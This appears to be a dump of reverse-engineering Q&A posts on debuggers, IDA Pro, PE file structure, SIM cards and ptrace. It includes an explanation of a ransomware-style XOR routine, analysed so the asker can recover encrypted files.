<p><a href=""https://en.wikipedia.org/wiki/Tiny_C_Compiler#Compiled_program_performance"" rel=""nofollow"">https://en.wikipedia.org/wiki/Tiny_C_Compiler#Compiled_program_performance</a></p>
","4647"
"How does a SIM card work?","1171","","<p>I understand that a SIM card has memory, and that some or maybe all of them also include microprocessors.  </p>

<p>They act as peripherals that are more than just flash memory.</p>

<p>I would like to be able to read the contents and extract my contacts and messages, for backup, so I bought an el-cheapo ""SIM Card Reader"" that plugs into a USB port.  But when I plug it in it is as if it isn't even there.  </p>

<p>So how can I get access to the data?</p>

<p>Secondly, I understand that they can affect the baseband portion of the cellphone, including frequency of operation and whatever codes are necessary to identify itself (IMEI) and to access a particular network (T-Mobile, AT&amp;T, Verizen).  Again, it is clearly more than just flash memory.</p>

<p>So my question is, how exactly do they work, and how can I get into my own card?</p>
","<p>SIMs card are a type of Universal Integrated Circuit Card (UICC).</p>

<blockquote>
  <p>how exactly do they work</p>
</blockquote>

<p>According to <a href=""http://2014.phdays.com/program/tech/36814/"" rel=""nofollow noreferrer"">Karsten Nohl's presentation ""Mobile Network Attack Evolution""</a>, SIM cards contain an embedded <a href=""https://en.wikipedia.org/wiki/Real-time_operating_system"" rel=""nofollow noreferrer"">real-time operating system</a>, a filesystem and a Java VM:</p>

<p><a href=""https://i.stack.imgur.com/L6qqP.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/L6qqP.png"" alt=""Presentation slide 1""></a></p>

<p>Here is the technical specification for UICCs, which describes exactly how they work: </p>

<p><a href=""http://www.etsi.org/deliver/etsi_ts/102200_102299/102221/08.02.00_60/ts_102221v080200p.pdf"" rel=""nofollow noreferrer"">ETSI TS 102 221 V8.2.0 (2009-06)
Technical Specification for smart cards, the UICC-Terminal interface and physical and logical characteristics</a>.</p>

<blockquote>
  <p>how can I get access to the data?  how can I get into my own card?</p>
</blockquote>

<p>This DefCon presentation <a href=""https://www.youtube.com/watch?v=_-nxemBCcmU"" rel=""nofollow noreferrer"">""DEF CON 21 - Karl Koscher and Eric Butler - The Secret Life of SIM Cards""</a> video explains quite a bit about SIM cards and how to interface with them.</p>

<p>From the <a href=""http://simhacks.github.io/defcon-21/"" rel=""nofollow noreferrer"">presentation slides</a>:</p>

<p><a href=""https://i.stack.imgur.com/gotqq.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/gotqq.png"" alt=""Interfacing with SIM Cards 1""></a></p>

<p>They also had trouble:</p>

<p><a href=""https://i.stack.imgur.com/OCEGU.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/OCEGU.png"" alt=""Interfacing with SIM Cards 2""></a></p>

<p>They found <a href=""http://simalliance.org/key-technical-releases/"" rel=""nofollow noreferrer"">SIM Alliance Loader</a> software...</p>

<p><a href=""https://i.stack.imgur.com/SDwbG.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/SDwbG.png"" alt=""Interfacing with SIM Cards 3""></a></p>

<p>...but decided to use <a href=""https://www.globalplatform.org/complianceproducts.asp"" rel=""nofollow noreferrer"">GlobalPlatform</a> instead, which is far more complicated. In order to use GlobalPlatform to interface with the SIM card, the presenters drew on techniques presented in <a href=""http://2014.phdays.com/program/tech/36814/"" rel=""nofollow noreferrer"">Karsten Nohl's research</a>.</p>
","15012"
"Highlight Executed Basic Blocks in IDA","1169","","<p>When I execute a program using IDA's debugger interface, I would like to see the basic blocks that were executed highlighted in the IDB. Is there a way to do this?</p>
","<p><strong><a href=""http://www.openrce.org/downloads/details/171"" rel=""nofollow noreferrer"">Process Stalker</a></strong> is designed to do exactly what you want.</p>

<p><img src=""https://i.stack.imgur.com/qYf7z.gif"" alt=""Snippet of Process Stalker&#39;s basic block highlighting""></p>

<p>Sample usage: <a href=""https://www.openrce.org/articles/full_view/12"" rel=""nofollow noreferrer"">https://www.openrce.org/articles/full_view/12</a></p>

<p>PowerPoint slides: <a href=""http://2005.recon.cx/recon2005/papers/Pedram_Amini/process_stalking-recon05.pdf"" rel=""nofollow noreferrer"">http://2005.recon.cx/recon2005/papers/Pedram_Amini/process_stalking-recon05.pdf</a></p>
","2231"
"Windbg x64 setting breakpoint","1166","","<p>My issue is all about setting the breakpoint on x64 Windbg. 
For x86 to combine IDA and Windbg analysis nothing is required. Just copy and paste the IDA address value and it works just fine.
For instance, in x86 I have <code>sub_401000</code>, so, the corresponding breakpoint is set by <code>bp 401000</code><br>
In x64 I have address <code>sub_140001000</code>, so, I'm trying to set as follows <code>bp 140001000</code> and get no result at all. Application won't reach my breakpoint. That's why, I've just set <code>bp 1401172F1</code> that reaches the address of interest for sure.</p>

<p>But now I've faced with error </p>

<pre><code>Unable to insert breakpoint 0 at 00000001`401172f1, Win32 error 0n998
The breakpoint was set with BP.  If you want breakpoints
to track module load/unload state you must use BU.
bp0 at 00000001`401172f1 failed
WaitForEvent failed
</code></pre>

<p>All these answers make sense, but setting breakpoint for this rva leads to error for some reason. Maybe I should try something else?</p>

<pre><code>0:000&gt; lmi
start             end                 module name            
00000000`77570000 00000000`77719000   ntdll      (pdb symbols)          C:\Windows\SYSTEM32\ntdll.dll
00000000`77740000 00000000`77743000   normaliz   (deferred)             
00000001`3fd90000 00000001`402e0000   module_of_interest   (no symbols)
</code></pre>
","<p>The error is due to the specified address belonging to an unmapped page. Normally, you would follow the advice in the debugger and use '<code>bu</code>', which monitors new memory maps and adds the breakpoint when that page is mapped (soft breakpoints write opcodes to the memory location).</p>

<p>In this case, it appears that you are trying to break on the main executable, which should be loaded before you are given interactive access in the debugger. It's likely that ASLR has relocated your main image. You can use the '<code>lm</code>' command or access the loaded modules dialog through the toolbar to observe the base address of the module you are interested in. </p>

<p>The preferred base address from the PE header is what IDA uses when loading the image. Subtract the base address shown in IDA (140001000) from your target address (00000001401172f1) to get the RVA (1162f1), and add that to the base address indicated by the module list in Windbg. </p>
","4020"
"Importing C header file with memory location definitions","1165","","<p>Bear with me as I am new to IDA and have not managed to find an answer to my question on google or other related outlets.</p>

<p>I am reversing a firmware blob from an ARM device of which I have a c header file defining various memory locations as follows:</p>

<pre><code>#define IO_LCD_OUT 0x4000000
</code></pre>

<p>Is there a way I can load this header file into IDA in order to redefine immediate values?</p>

<p>For Example, instead of:</p>

<pre><code>MOV     R12, #0x4000000
</code></pre>

<p>Could IDA instead print:</p>

<pre><code>MOV     R12, IO_LCD_OUT
</code></pre>

<p>Are there other ways to acheive this outcome aside from how I am trying to approach this? I have the header file with memory locations defined and would like to load that information into ida!</p>

<p>I have tried to parse it using File -> Load File -> Parse C Header File and have had no luck! </p>
","<p>You can use custom enumerations here.</p>

<ol>
<li>Go to Enums list (<kbd>Shift</kbd>+<kbd>F10</kbd>).</li>
<li>Add a new enum for you list of constants (<kbd>Ins</kbd>)</li>
<li>Add constant(s) to the list (<kbd>N</kbd>), e.g. name <code>IO_LCD_OUT</code> and value <code>0x4000000</code></li>
<li>Now you should be able to replace these constants in the disassembly, using <kbd>M</kbd> or the context menu.</li>
</ol>

<p>You can speed up things by:</p>

<ol>
<li>Generating an IDC file from the header to build the enum programmatically (use functions <code>AddEnum</code> and <code>AddConstEx</code>). The <a href=""https://www.hex-rays.com/products/ida/support/download.shtml"" rel=""nofollow""><code>h2enum.idc</code> script</a> might work too.</li>
<li>Converting those defines to a C style <code>enum</code>, parsing the header, then using the imported enum from your disassembly (you will need to first perform <code>Synchronize to idb</code> step in the Local Types).</li>
</ol>
","6656"
"How to debug with remote binaries radare2?","1159","","<p>i am reading differents documentation about radare2 but i don't read nothing about how can i debug a binary in remote machine.</p>

<p>Actually i am a security research and i need execute binaries in other laboratory virtual machine (winxp).</p>

<p>Thanks for all.</p>
","<p><a href=""http://radare.today/posts/using-radare2/"" rel=""nofollow"">This blogpost</a> will probably answer your question. Search for windbg, if you're only interested in this part. Maybe using the r2 debugger on the target works with rap://.</p>
","11254"
"Check if binary was compiled with security checks (/GS)","1155","","<p>I have to check massive amount of binaries whether they were compiled with the <code>/GS</code> option. I assume a good indicator would be to check if they have stack cookie or not. Do you know any tool that can do this, or any tool that I could build into a script, so I don't have to do it manually?</p>

<h2>Edit</h2>

<p><a href=""http://technet.microsoft.com/en-us/library/ee672187.aspx"" rel=""nofollow"">Found</a> <a href=""http://www.microsoft.com/en-us/download/details.aspx?id=44995"" rel=""nofollow"">Binscope</a>, I'll check if it's capable to check more binaries at the same time or it's scriptable.</p>

<h2>Edit2</h2>

<p>It requires debug symbols, so this is not a solution.</p>

<h2>Edit3</h2>

<p><a href=""https://github.com/NetSPI/PEchecker"" rel=""nofollow"">https://github.com/NetSPI/PEchecker</a></p>
","<ol>
<li><p>you can check the <a href=""http://mingw-w64.sourcearchive.com/documentation/2.0-1/ntimage_8h_source.html#l00107"" rel=""nofollow""><code>IMAGE_LOAD_CONFIG_DIRECTORY</code></a> structure, it has a field for the pointer to <code>SecurityCookie</code>'s value in the image.</p></li>
<li><p>In very old binaries, this structure might be not used, or <code>SecurityCookie</code> RVA is 0 even though the binary may be using <code>/GS</code>. In such case you can scan for the characteristic code signature of the <code>@__security_check_cookie@4</code> function:</p>

<pre><code>3B0D........7501C3E9 (VC7)  
3B0D........0F85........C3 (VC7?)  
3B0D........7502F3C3E9 (VC8+)
</code></pre></li>
<li><p>you can also scan for the initial cookie value (<code>BB40E64E</code>) in the binary. Though I guess this might produce some false positives.</p></li>
</ol>
","6709"
"IDA Pro C dump for Decryption function","1153","","<p>I have been battling this infection I got that encrypts my files in 512 byte chunks with a friend. We have managed to find the Decryption function we think in IDA (the code is <em>heavily</em> obfuscated) from a user who paid for the decrypter. Below is the C dump of the encryption function:</p>

<pre><code>int __stdcall sub_40C78E(int a1, int a2, int a3, int a4)
{
  int result;
  char v5; 
  int v6; 
  int v7; 
  int v8; 

  v7 = a1;
  v6 = a2;
  v5 = 0;
  result = 0;
  if ( a2 )
  {
    v8 = a3;
    do
    {
      LOBYTE(v8) = v5 + v8;
      *(_BYTE *)v7 ^= v8;
      v5 = *(_BYTE *)v7++;
      v8 = __ROL__(a4 + v8, 8);
      --v6;
    }
    while ( v6 );
    result = v8;
  }
  return result;
}
</code></pre>

<p>My friend tried to simplify it or make sense of it and this is what he came up with:</p>

<pre><code>int __stdcall sub_40C78E((_BYTE *)buffer, int nonce1, int nonce2)
{
  char v5; 
  int n; 
  int v8; 

  n = 0x400;    // It is a little bit confusing, because the length of block is 0x200 (rest of buffer is filled by 0).
                        // Only first 0x200 bytes are saved to a file for block CT0A.
  v5 = 0;
  v8 = nonce1;

  do
  {
      LOBYTE(v8) = v5 + LOBYTE(v8);
      *buffer ^= LOBYTE(v8);
      v5 = *buffer;
      buffer++;
      v8 = __ROL__(nonce2 + v8, 8);
      --n;
  }
  while ( n );

return v8;       
}
</code></pre>

<p>Where nonce1 and nonce2 is suppose to represent some kind of key.</p>

<p>What we have found with this infection is that if you XOR the first byte of the cipher text with the plain text, you get a key byte you can use to get the first byte of every file back. Which makes sense with this function because the first time in the loop the key is added to 0, which means it is simply the key. But then this guy used some type of weird CFB type xor encryption where it uses the previous xor'ed byte with the key next.</p>

<p>I just don't quite understand the function and I was hoping somewhere here could perhaps simplify it more for me or explain it. I also know C#, and VB if anyone would know how to explain the function in these languages.</p>
","<p>As you expected, it's doing a very simple XOR.  The equivalent code looks something like this:</p>

<pre><code>int mystery(char *buff, int bufsize, int nonce1, int nonce2)
{
  int result = 0;
  // ch is the next byte (character) in the buffer
  char ch = 0; 
  int count = bufsize; 
  char *ptr = buff; 
  int x;

  for (x = nonce1; count; --count)
  {
      // this bit of trickery just replaces the low 8 bits
      // of x with the low 8 bits of (x+ch) neglecting carry, if any
      x = (x &amp; ~0xff) | ((x+ch) &amp; 0xff);
      // XOR the buffer with the calculated x value
      *ptr ^= x;
      // read in the next character into ch
      ch = *ptr++;
      // obfuscate by adding nonce2 
      x += nonce2;
      // if x = 0x12345678, this would make it 0x34567812
      // for 32-bit ints.  Just a rotate left of 8 bits.
      x = (x&lt;&lt;8) | ((x &gt;&gt;((sizeof(int)-1)*8) ) &amp; 0xff);  
  }
  result = x;
  // return the last calculated x which may be used to chain all
  // of the blocks together.  That is, the return value x is 
  // probably passed as nonce1 to encode the next block.
  return result;
}
</code></pre>
","4228"
"how to attach to a process as soon as it is loaded in memory","1151","","<p>I want to attach OllyDbg or IDA to a process as soon as it is loaded in memory before a single instruction of it being executed. How do I do This???
I cant use File->Open for some reason. I can only attach to it.</p>
","<p>One way to do is create a new process using <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx"" rel=""nofollow""><code>CreateProcess</code></a> with <code>dwCreationFlags</code> as <code>CREATE_SUSPENDED</code>. Next attach to the suspended process using your debugger, and resume all threads.</p>

<p>Some other way would be to edit the PE file and change the bytes at the entrypoint to <code>EB FE</code>.
This is an instruction that jumps to itself, i.e. it is an infinite loop. Next start the application normally. Now use a debugger to attach to it. Restore the original bytes at the entrypoint and resume the process.</p>
","6687"
"OllyDBG's disassembled syntax and c-equivalent","1151","","<p>This is probably a pretty simple question as I'm not too used to how the syntax looks for OllyDBG's disassembler. </p>

<p>Does this following assembler statement:</p>

<pre><code>MOV EAX, DWORD PTR [ESI + 14]
</code></pre>

<p>Be roughly translated to this C code:</p>

<pre><code>eax = *(esi + 0x14);
</code></pre>

<p>Have I understood the syntax correctly or am I misunderstanding this? </p>
","<p>The <code>DWORD PTR [expression]</code> syntax means ""take the value of <code>expression</code>, interpret it as an address, and access 4 (size of a <code>DWORD</code>) bytes starting with that address"". But assembly data types are rather different from those of C, so many C types can be accessed this way.</p>

<p>The instruction you provided is basically equivalent to C code:</p>

<pre><code>typedef dword_t ...;
dword_t eax = *(dword_t *)((char *)esi + 0x14);
</code></pre>

<p>This instruction can be used to access 4 contiguous bytes no matter what the C type of those bytes is - in the line above, you could (on a 32 bit system) define <code>dword_t</code> as <code>int</code>, <code>float</code>, <code>void *</code> or another type of the appropriate size, and it would still work the same way, it's just bits and bytes travelling from one place to another. With a reasonably smart compiler, this can even be used to read entire structs or arrays in one step, as long as their length is small enough.</p>

<blockquote>
  <p>But this later on could be used as a pointer if that's what you'd like?</p>
</blockquote>

<p>As I said, it is not possible to say what the original C type of those bytes is just from this context. You have to look at other places where this value is used and look for indicators of the specific type. If you see it used in <code>[eax]</code> or a similar expression - it's probably a pointer. If it's used in a more complex expression, like <code>[eax + ecx]</code>, one of the two is a pointer and the other is an array index/byte displacement from that pointer, but there's no telling which is which just from that line, more context is needed.</p>
","2434"
"How can I locate exported functions of an EXE or DLL?","1148","","<p>I am trying to do some experimenting with certain system files (DLLs, EXEs) in Windows and would like to know how I can get information about the functions that they contain. I want to be able to call some of them just as if Windows does. How could one do this? </p>

<p>I guess I would need to know what the function names are, and how to call the functions by their names, and what parameters to pass.</p>
","<p><strong>TL;DR</strong> you can call anything, locating the right part of code is the hard part.</p>

<h1>export table</h1>

<p>If you mean 'just as Windows does', then you mean the functions of the DLL that are available to the others, ie the exported ones? in this case, you need to parse the export table - check <a href=""http://code.google.com/p/pefile/source/browse/trunk/pefile.py#3349"">pefile</a> for a readable and reliable implementation.</p>

<h1>locating any function</h1>

<h2>IDA</h2>

<p>If you actually mean 'all the functions, including the internal ones', then you need to disassemble and tell the difference from code and data. in this case, your best bet is to open the files in IDA - with symbols preferrably - and export the function list.</p>

<h2>manually</h2>

<p>If you want to do that manually, then you need your own smart disassembler, which is far from trivial: sometimes, compilers generate some code that doesn't immediately look like parts of a function.</p>

<h2>calling identified functions</h2>

<p>Once you've located the functions, you can just call them directly, without the need of injection, but you have to make sure you have the exact same version of the DLL. <a href=""https://code.google.com/p/corkami/source/browse/trunk/src/PE/hard_imports.asm"">hard_imports</a> use such a method to call pieces of code directly.</p>
","2929"
"idapython: getting a list of all segments","1145","","<p>If I open the Segments subview in IDA, I can get a list of all of the segments.</p>

<p>I would like to access this list so I can enumerate through all of the segments.</p>

<p>How can I do this with idapython?</p>
","<p>Try to use the <code>Segments()</code> from <a href=""https://www.hex-rays.com/products/ida/support/idapython_docs/"" rel=""nofollow"">idautils</a>.</p>

<pre><code>from idautils import *
from idc import *
from idaapi import *

for ea in Segments():
    print '%x-%x'%(SegStart(ea),SegEnd(ea))
</code></pre>
","12362"
"How to change address in the hex view in IDA debugger?","1140","","<p>I'm just learning the IDA pro debugger, so I apologize if this is something simple. Say, if I opened a debugee process and started stepping through it with a debugger (WinDbg) and then want to look up the contents of memory. How do I change the address in the hex view pane?</p>

<p>(Circled in red in this screenshot)</p>

<p><a href=""https://i.stack.imgur.com/H5OTp.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/H5OTp.png"" alt=""enter image description here""></a></p>
","<p>Click on the hex view plane and press <kbd>G</kbd> to change the address.</p>
","11870"
"How to view strings in an executable?","1140","","<p>I have been playing around, searching for  Strings</p>

<pre><code>  ""Please wait!!!""
   ""Done!!""
</code></pre>

<p>Then I didn't find them in a Debugger so somebody suggested BinText can do the job, so I found this</p>

<pre><code> File pos Mem pos ID Text 
 ======== ======= == ==== 
 0000000922E8 000000492EE8 0 Caption 
 00000009230A 000000492F0A 0 Checked 
 00000009232C 000000492F2C 0 SubMenuImages 
 000000092354 000000492F54 0 Default 
 000000092376 000000492F76 0 Enabled 
 000000092402 000000493002 0 ImageIndex 
 000000092426 000000493026 0 RadioItem 
 00000009244B 00000049304B 0 ShortCut 
 00000009246E 00000049306E 0 Visible 
  000000092490 000000493090 0 OnClick 
</code></pre>

<p>Here follows the troublesome strings</p>

<pre><code>  0000000ED716 0000004EE316 0 EJPEG 
  0000000EEB97 0000004EF797 0 ;w8tF 
  0000000EFE33 0000004F0A33 0 C(D   O 
  0000000EFFA4 0000004F0BA4 0 T;{$| 
  0000000F002C 0000004F0C2C 0 T;{$| 
  0000000F004F 0000004F0C4F 0 ;K$|  
  0000000F0995 0000004F1595 0 ;K4w/ 
  0000000F09CF 0000004F15CF 0 ;K4w, 
  0000000F0A05 0000004F1605 0 ;K4w, 
  0000000F0A9D 0000004F169D 0 T;{$| 
  0000000F0AE4 0000004F16E4 0 T;{$| 
  0000000F1A11 0000004F2611 0 D$$PU 
  0000000F1D3B 0000004F293B 0 A;K$| 
  0000000F3377 0000004F3F77 0 0;C$| 
  0000000F3426 0000004F4026 0 K,;K(u 
  0000000F36DA 0000004F42DA 0 T$$;L$ 
  0000000F372D 0000004F432D 0 Jx;L$ 
  0000000F39C4 0000004F45C4 0 $;Zx| 
  0000000F3F52 0000004F4B52 0 t&amp;ItZ 
  0000000F41E7 0000004F4DE7 0 D$$;T$ 
  0000000F41FB 0000004F4DFB 0 L$ ;\$ 
  0000000F4265 0000004F4E65 0 L$,;T$ 
  0000000F4279 0000004F4E79 0 L$(;\$ 
  0000000F42EE 0000004F4EEE 0 L$0;T$ 
  0000000F4363 0000004F4F63 0 L$4;T$ 
  0000000F43D2 0000004F4FD2 0 L$8;T$ 
  0000000F4441 0000004F5041 0 L$&lt;;T$ 
  0000000F44E4 0000004F50E4 0 D$D;T$ 
  0000000F44F8 0000004F50F8 0 L$@;\$ 
  0000000F46C7 0000004F52C7 0 D$,;L$ 
  0000000F46DF 0000004F52DF 0 T$(;\$ 
  0000000F4740 0000004F5340 0 l$$B; 
  0000000F5466 0000004F6066 0 T;s$| 
  0000000F55A8 0000004F61A8 0 P$;T$ 
  0000000F56A4 0000004F62A4 0 P$;T$ 
  0000000F5767 0000004F6367 0 P$;T$ 
  0000000F58A3 0000004F64A3 0 rMtsJ 
  0000000F58D4 0000004F64D4 0 C4;CH 
  0000000F5940 0000004F6540 0 C4;CHr3
</code></pre>

<p>Are these real strings or they broken encrypted or something?
How can I achieve this?</p>
","<p>These are not real strings, thats just binary data that can be interpreted as strings. That's how tools like BinText work - by trying to evaluate any sequence of bytes as a string and accepts it as one when a threshold is passed (usually around 4 characters).</p>

<p>I'm not familiar with BinText, but the tool I frequently use for such tasks is 010 Editor (<a href=""http://www.sweetscape.com/010editor"" rel=""nofollow"">http://www.sweetscape.com/010editor</a>). It's a really good text and hex editor and it has a free trial license. It can basically edit anything on your computer (text and binary files, hard drive, processes), has templates for parsing known file formats, scripts and advanced binary search options. The feature you're looking for is their ""Find Strings"" option that finds all strings regardless of formats and can be easily tuned with a few parameters. </p>

<p>Because strings may be represented in several formats having a tool that's aware of that and supports searching multiple formats simultaneously can be really helpful with these type of searches. </p>

<p>Obviously the strings may be obfuscated and in that case searching won't do, but that's a bit out of the scope of this question. Open another one and I'll answer that as well. </p>
","11143"
"NOP instruction","1139","","<p>I have recently learned that <code>nop</code> instruction is actually <code>xchg eax, eax</code>... what it does is basically exchanges <code>eax</code> with itself. </p>

<p>As far as CPU goes, does the exchange actually happen?</p>
","<p>There are several instructions, which could be used depending on the compiler. <code>xchg eax, eax</code> is byte code 90. It is a legit instruction, which takes up a single processing cycle. In addition, there are several other instructions, which could be used in place of <code>xchg eax, eax</code>: </p>

<pre><code>lea eax, [eax + 0x00]    byte code 8D 40 00
mov eax, eax             byte code 89 C0
</code></pre>

<p>Since all of those instructions are different length, compiler chooses one of the most appropriate versions depending on alignment requirements. </p>
","2305"
"Is there a way to set the cursor address in IDA Pro?","1138","","<p>In the same way that <code>ScreenEA()</code> returns the current cursor address, is there a way to <em>set</em> the address? Something that would resemble <code>SetScreenEA()</code>?</p>
","<p>Use <a href=""https://www.hex-rays.com/products/ida/support/idadoc/194.shtml""><code>Jump</code></a> for IDC or <a href=""https://www.hex-rays.com/products/ida/support/idapython_docs/idc-module.html#Jump""><code>idc.Jump</code></a> for ida python.</p>
","11534"
"How to know if PE Header import function is being imported by Ordinal rather than by name","1137","","<p>I want to know how to find out if an imported function in a PE header is being imported by ordinal rather than by name because I came across an executable that does that. Here is the DLL that imports all functions by ordinal except for one (from <code>WS2_32.dll</code>):</p>

<p>Screenshot from program called <code>ExeinfoPE</code>
<a href=""https://i.stack.imgur.com/W3zGE.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/W3zGE.png"" alt=""enter image description here""></a></p>

<p>This is what I'm doing to get to the imports:</p>

<ol>
<li>Read the PE header.</li>
<li>Loop over data directories and find <code>IMAGE_DIRECTORY_ENTRY_IMPORT</code>.</li>
<li><p>Once <code>IMAGE_DIRECTORY_ENTRY_IMPORT</code> is found, loop over <code>IMAGE_IMPORT_DESCRIPTORS</code>.</p></li>
<li><p>On each <code>IMAGE_IMPORT_DESCRIPTORS</code>, extract all the functions.</p></li>
</ol>

<p>Here is how I extract the functions (only works for functions imported by name):</p>

<pre><code>void extractFunctions(IMAGE_IMPORT_DESCRIPTOR dll, uintptr_t sectionStartAddrRaw) {
    uintptr_t selectedFunctionImport = dll.Characteristics + sectionStartAddrRaw;
    uintptr_t selectedFunctionImportIAT = dll.FirstThunk + sectionStartAddrRaw;

    while (true) {
        IMAGE_THUNK_DATA thunkPtrToImportByName = *(IMAGE_THUNK_DATA*)selectedFunctionImport;
        selectedFunctionImport += sizeof(IMAGE_THUNK_DATA); //Next loop we'll loop over to the next IMAGE_THUNK_DATA.
        if (thunkPtrToImportByName.u1.Function == NULL) { //Check if we need to exit the looping since there are no more functions to import.
            break;
        }

        IMAGE_IMPORT_BY_NAME* functionImport = (IMAGE_IMPORT_BY_NAME*)(thunkPtrToImportByName.u1.Function + sectionStartAddrRaw);

        Function function;
        function.name = std::string(functionImport-&gt;Name); //Access violation here if the function needs to be imported by ordinal, instead of by name.
        function.locationInIAT = selectedFunctionImportIAT;
        function.locationInOriginalIAT = selectedFunctionImportIAT - sectionStartAddrRaw + header.OptionalHeader.ImageBase;

        selectedFunctionImportIAT += sizeof(IMAGE_THUNK_DATA);
        dlls.back().functions.push_back(function); //We assume that IMAGE_IMPORT_DESCRIPTOR dll is the last one in the dlls vector.]
    }
}
</code></pre>

<p>I noticed that every function Hint/Ordinal inside <code>ExeinfoPE</code> that is imported by name is <code>0</code>. However, in my code <code>functionImport-&gt;Hint</code> is always set to something, regardless if the function is supposed to be imported by name or ordinal.</p>

<p>The <code>IMAGE_IMPORT_DESCRIPTOR</code> cannot have information on whether the functions inside that <code>IMAGE_IMPORT_DESCRIPTOR</code> are imported by ordinal or name, since one of the functions is imported by name and all of the others are imported by ordinal. So, I'm all out of ideas here.</p>

<p>Here are the data structures I'm using for your reference so no need to Google:</p>

<pre><code>typedef struct _IMAGE_THUNK_DATA {
    union {
        uint32_t* Function;             // address of imported function
        uint32_t  Ordinal;              // ordinal value of function
        PIMAGE_IMPORT_BY_NAME AddressOfData;        // RVA of imported name
        DWORD ForwarderStringl              // RVA to forwarder string
    } u1;
} IMAGE_THUNK_DATA, *PIMAGE_THUNK_DATA;

typedef struct _IMAGE_IMPORT_DESCRIPTOR {
    union {
        DWORD   Characteristics; /* 0 for terminating null import descriptor  */
        DWORD   OriginalFirstThunk; /* RVA to original unbound IAT */
    } DUMMYUNIONNAME;

    DWORD   TimeDateStamp;  /* 0 if not bound,
    * -1 if bound, and real date\time stamp
    *    in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT
    * (new BIND)
    * otherwise date/time stamp of DLL bound to
    * (Old BIND)
    */
    DWORD   ForwarderChain; /* -1 if no forwarders */
    DWORD   Name;
    /* RVA to IAT (if bound this IAT has actual addresses) */
    DWORD   FirstThunk;
} IMAGE_IMPORT_DESCRIPTOR,*PIMAGE_IMPORT_DESCRIPTOR;

typedef struct _IMAGE_IMPORT_BY_NAME {
    WORD    Hint;
    BYTE    Name[1];
} IMAGE_IMPORT_BY_NAME,*PIMAGE_IMPORT_BY_NAME;
</code></pre>
","<p>Extracted from <a href=""http://www.pelib.com/resources/luevel.txt"" rel=""nofollow"">http://www.pelib.com/</a>:</p>

<blockquote>
  <p>First, the bit <code>IMAGE_ORDINAL_FLAG</code> (that is: the <code>MSB</code>) of the
  <code>IMAGE_THUNK_DATA</code> in the arrays can be set, in which case there is no
  symbol-name-information in the list and the symbol is imported purely by
  ordinal. You get the ordinal by inspecting the lower word of the
  <code>IMAGE_THUNK_DATA</code>.</p>
  
  <p><code>IMAGE_THUNK_DATA</code>-array; walk down this array (it is be
  <code>0</code>-terminated), and each member will be the RVA of a
  <code>IMAGE_IMPORT_BY_NAME</code> (unless the hi-bit is set in which case you
  don't have a name but are left with a mere ordinal).</p>
</blockquote>

<p>A more detailed explanation extracted from a <a href=""http://fossies.org/linux/volatility/volatility/plugins/overlays/windows/pe_vtypes.py"" rel=""nofollow"">volatility plugin</a> (lines 363-367):</p>

<pre><code>350  while 1:
351      thunk = obj.Object('_IMAGE_THUNK_DATA',
352                 offset = self.obj_parent.DllBase + self.OriginalFirstThunk +
353                 i * self.obj_vm.profile.get_obj_size('_IMAGE_THUNK_DATA'),
354                 vm = self.obj_native_vm)

355      # We've reached the end when the element is zero 
357      if thunk == None or thunk.AddressOfData == 0:
358          break
359      o = obj.NoneObject(""Ordinal not accessible?"")
361      n = obj.NoneObject(""Imported by ordinal?"")
362      f = obj.NoneObject(""FirstThunk not accessible"")

363      # If the highest bit (32 for x86 and 64 for x64) is set, the function is 
365      # imported by ordinal and the lowest 16-bits contain the ordinal value. 
366      # Otherwise, the lowest bits (0-31 for x86 and 0-63 for x64) contain an 
367      # RVA to an _IMAGE_IMPORT_BY_NAME struct. 
368      if thunk.OrdinalBit == 1:
369          o = thunk.Ordinal &amp; 0xFFFF
370      else:
371          iibn = obj.Object(""_IMAGE_IMPORT_BY_NAME"",
372                            offset = self.obj_parent.DllBase +
373                            thunk.AddressOfData,
374                            vm = self.obj_native_vm)
375          o = iibn.Hint
376          n = iibn.Name
377      # See if the import is bound (i.e. resolved)
379      first_thunk = obj.Object('_IMAGE_THUNK_DATA',
380                      offset = self.obj_parent.DllBase + self.FirstThunk +
381                      i * self.obj_vm.profile.get_obj_size('_IMAGE_THUNK_DATA'),
382                      vm = self.obj_native_vm)
383      if first_thunk:
384          f = first_thunk.Function.v()
385      yield o, f, str(n or '')
387      i += 1
</code></pre>
","13387"
"Why/how is GDB allowed to attach to a process and read/write to attached process' address space?","1135","","<p>The fact that GDB can attach to any process without having su rights is terrifying to me. For example, what prevents me from writing a malware/virus(/whatever the correct term is) that uses same system calls with GDB to attach to any processes, send interrupts, change instructions on the fly, add breakpoints to branching instructions to alter ZF etc.?</p>

<p>You can clearly do lots of harmful things with this ability. For example, I'm doing some minor hacks using some GDB Python scripts and I can't see what's preventing me from writing some seriously dangerous/malicious stuff.</p>

<p>So I have some number of questions related with how is this possible and how is this safe:</p>

<p>(I'm assuming that it's the operating system who allows a process to somehow send interrupts to some other one, and access to it's address space and alter the memory. Please correct me if I'm wrong)</p>

<p>1) What makes this safe? What prevents me from writing a program that alters behaviours of every single process running in a system?</p>

<p>2) What system calls are involved? How does operating system give me access to address space of some other process, while not taking my own address space from me. (e.g. GDB has it's own address space, but it can also read attached process' address space)</p>

<p>3) In my user-level program, is it possible to detect this kind of ""attaching""? Like, can I print a message and terminate if another process is attached to my program? How do I detect this?</p>

<p>(I'm using ""attaching"" as ""starting writing/reading my address space"")</p>

<p>Thanks.</p>
","<p>2) The system call is <a href=""http://en.wikipedia.org/wiki/Ptrace"" rel=""noreferrer""><code>ptrace</code></a>. That call has lots of functionality, including ""copy a section of the tracee's memory into a local buffer in my address space"" and the reverse ""copy my buffer to the tracee's memory"". These are quite similar to windows' <code>ReadProcessMemory</code>  and <code>WriteProcessMemory</code>. The tracing program needs to use these to access memory in the traced program.</p>

<p>1) The fact that you can't, really, attach to processes that aren't yours, unless you have <code>root</code> access, or (on Linux), the <code>CAP_SYS_PTRACE</code> capability. In some newer Linuxes, you don't even have rights to <code>ptrace</code> all of your own processes, depending on the <code>yama</code> settings and whether the traced process is a (grand)child of the tracing process. The wikipedia page explains this in more detail.</p>

